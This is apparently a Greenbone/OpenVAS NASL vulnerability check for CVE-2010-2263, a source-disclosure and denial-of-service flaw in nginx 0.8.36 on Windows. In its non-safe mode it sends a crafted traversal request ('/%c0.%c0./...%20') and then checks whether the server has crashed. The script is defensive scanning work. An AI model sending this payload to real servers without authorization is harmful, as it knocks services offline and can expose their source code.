# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nginx:nginx";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100676");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2010-06-14 14:19:59 +0200 (Mon, 14 Jun 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-2263");

  script_name("nginx <= 0.8.36 Remote Source Code Disclosure and DoS Vulnerabilities");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121201422/http://www.securityfocus.com/bid/40760");

  script_tag(name:"qod_type", value:"remote_probe");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("os_detection.nasl", "gb_nginx_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("nginx/detected", "Host/runs_windows");

  script_tag(name:"summary", value:"nginx is prone to remote source code disclosure and denial of
  service (DoS) vulnerabilities.");

  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities to view the source
  code of files in the context of the server process or cause denial-of-service conditions.");

  script_tag(name:"affected", value:"nginx version 0.8.36 for Windows is known to be vulnerable.
  Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("version_func.inc");

if( isnull( port = get_app_port( cpe: CPE ) ) )
  exit( 0 );

if( safe_checks() ) {
  if( ! infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: TRUE ) )
    exit( 0 );

  version = infos["version"];
  location = infos["location"];

  if( version_is_equal( version: version, test_version: "0.8.36" ) ) {
    report = report_fixed_ver( installed_version: version, fixed_version: "None", install_path: location );
    security_message( port: port, data: report );
    exit( 0 );
  }
} else {
  if( ! port )
    exit( 0 );

  host = http_host_name( port: port );

  if( http_is_dead( port: port ) )
    exit( 0 );

  url = "/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%20";
  req = string( "GET ", url, " HTTP/1.1\r\nHost: ", host, "\r\n\r\n" );

  soc = http_open_socket( port );
  if( ! soc )
    exit( 0 );

  send( socket: soc, data: req );

  if( http_is_dead( port: port ) ) {
    close( soc );
    report = http_report_vuln_url( port: port, url: url );
    security_message( port: port, data: report );
    exit( 0 );
  }

  http_close_socket( soc );
}

exit( 99 );
